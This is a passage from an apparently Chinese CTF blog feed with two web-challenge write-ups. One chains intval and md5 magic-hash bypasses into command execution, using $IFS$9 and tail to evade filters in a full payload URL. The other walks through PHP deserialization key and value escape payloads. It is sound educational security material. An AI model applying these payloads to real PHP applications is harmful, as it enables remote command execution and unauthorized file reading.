        <content type="html"><![CDATA[<h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><h3 id="考点：1-MD5碰撞-2-命令执行绕过"><a href="#考点：1-MD5碰撞-2-命令执行绕过" class="headerlink" title="考点：1.MD5碰撞        2.命令执行绕过"></a>考点：1.MD5碰撞        2.命令执行绕过</h3><p>打开题发现编码有些问题，修改编码为utf-8</p><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020781.png" alt="image-20210615172904160"></p><p>看了源码和请求包没发现什么东西，看到title想到了robots.txt文件，打开看一看</p><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020782.png" alt="image-20210615173103570"></p><p>额，打开后发现</p><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020783.png" alt="image-20210615173125496"></p><p>在观察观察看到了这个</p><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020784.png" alt="image-20210615173204851"></p><p>终于找到源代码了！！！开心vヾ(≧▽≦*)o</p><p>php源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先是绕过2个if就可以成功进行RCE了</p><h3 id="Levle-1"><a href="#Levle-1" class="headerlink" title="Levle 1"></a>Levle 1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; intval(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)</span><br></pre></td></tr></table></figure><p>payload</p><blockquote><p>num = 2019e1</p></blockquote><p>本地测试一下就知道原因啦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">var_dump(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval(<span class="variable">$num</span> + <span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020785.png" alt="image-20210615174138446"></p><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$md5</span>==md5(<span class="variable">$md5</span>)</span><br></pre></td></tr></table></figure><ul><li>脚本走一波</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    md5 = hashlib.md5(<span class="string">f&#x27;0e<span class="subst">&#123;payload&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;0e<span class="subst">&#123;payload&#125;</span>  <span class="subst">&#123;md5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    payload += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>耐心点，可能要扫那么一小会</li></ul><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020786.png" alt="image-20210615184819985"></p><ul><li><p>payload:</p></li><li><blockquote><p>md5=0e215962017</p></blockquote></li></ul><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><ul><li>这里过滤了空格和cat，这些都是小事</li></ul><ol><li>空格使用$IFS$9</li><li> cat可以换做用more，tail等其他方法</li></ol><ul><li>最终payload</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://91e9c6f4-17af-46f9-b641-d91522c24f26.node3.buuoj.cn/fl4g.php?num=2019e1&amp;md5=0e215962017&amp;get_flag=tail$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><p><img src="/post/2021-05/[WUSTCTF2020]%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/202112062020787.png" alt="image-20210615184751206"></p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> RCE </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯2019-easy_serialize_php</title>
      <link href="/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/"/>
      <url>/post/2021-05/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Deasy_serialize_php/</url>
      
        <content type="html"><![CDATA[<h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><h3 id="考点：PHP反序列化的对象逃逸"><a href="#考点：PHP反序列化的对象逃逸" class="headerlink" title="考点：PHP反序列化的对象逃逸"></a>考点：PHP反序列化的对象逃逸</h3><p>PS：任何具有一定结构的数据，只要经过了某些处理把自身结构改变，则可能会产生漏洞</p><p><strong>过滤函数分为2种</strong></p><ol><li>关键词数增加</li><li>关键词数减少</li></ol><p>首先打开页面就可以查看源码（最喜欢做代码审计的题了(～￣▽￣)～）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过filter()函数可知，这个是属于第二种过滤函数（即关键词数减少）。</p><p>知道这些又有什么用呢？我们来一步一步的解读代码看看</p><ol><li>简单来说就是清空SESSION内的值，防止影响之后的传参</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>官方描述：extract() 函数从数组中将变量导入到当前的符号表。</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line">extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&gt;&gt; <span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse </span><br></pre></td></tr></table></figure><ol start="3"><li>这条代码没有那么难理解，但是它却决定了你最后输出了啥！（所以请牢记这条代码）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>将session的值序列化之后进行过滤（同样很重要的一条代码）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br></pre></td></tr></table></figure><ol start="5"><li>从这条代码可以发现，如果我们最后要读取数据，必须满足第3个if语句，并且要让’img’变成想要的参数，但是有通过第3段代码我们知道，如果要给’img_path’传参，之后会导致’img’的值为被sha1不可逆加密，所以必然是不可取得！所以我们必须要从<strong>数据改变结构的过程中进行改变数据</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;abcdefg&#x27;</span>]=<span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:5:&quot;Hello&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;cc&#x27;</span>]=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">==&gt; a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;abcdefg&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>注意观察序列化后的字符串，想一想，如果在它之中删去一些东西，是不是可以改变它原本的内容<br>这就是题目一开始说的，过滤函数使关键词数减少,我们试着删除一些关键词：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;abcdefg&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br><span class="line">==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:5:&quot;</span>Hello<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;cc&quot;</span>;i:<span class="number">2</span>;&#125;</span><br><span class="line">再次观察这个删除关键词后的序列化字符串</span><br></pre></td></tr></table></figure><p>它反序列化后应该是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span>[<span class="string">&quot;;s:48:]==&gt;&quot;</span><span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Array[img]==&gt;&quot;</span>Hello<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><strong>以上就是PHP反序列化对象逃逸中的“值逃逸”</strong></p><p>对象逃逸一共分为两种：</p><ol><li><p><strong>值逃逸</strong></p></li><li><p><strong>键逃逸</strong></p></li></ol><h4 id="接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸"><a href="#接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸" class="headerlink" title="接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸"></a>接下来我们分别使用这2种方法来完成这道题，并从中学会如何逃逸</h4><h3 id="思路一：键逃逸"><a href="#思路一：键逃逸" class="headerlink" title="思路一：键逃逸"></a>思路一：键逃逸</h3><p>其中使用逃逸的键为’flagphp’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">extract()==&gt; <span class="variable">$_SESSION</span>[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br><span class="line">serialize()==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;flagphp&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br><span class="line">filter()==&gt;</span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="思路二：值逃逸"><a href="#思路二：值逃逸" class="headerlink" title="思路二：值逃逸"></a>思路二：值逃逸</h3><p>其中使用逃逸的值为’flagflagflagflagflagflag’</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line">==&gt; <span class="variable">$_SESSION</span>[user]=flagflagflagflagflagflag&amp;<span class="variable">$_SESSION</span>[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;</span><br><span class="line">==&gt; </span><br><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string">==&gt;</span></span><br><span class="line"><span class="string">a:3:&#123;s:4:&quot;</span>user<span class="string">&quot;;s:24:&quot;</span><span class="string">&quot;;s:8:&quot;</span><span class="function"><span class="keyword">function</span>&quot;</span>;s:<span class="number">59</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;dd&quot;</span>;s:<span class="number">1</span>:<span 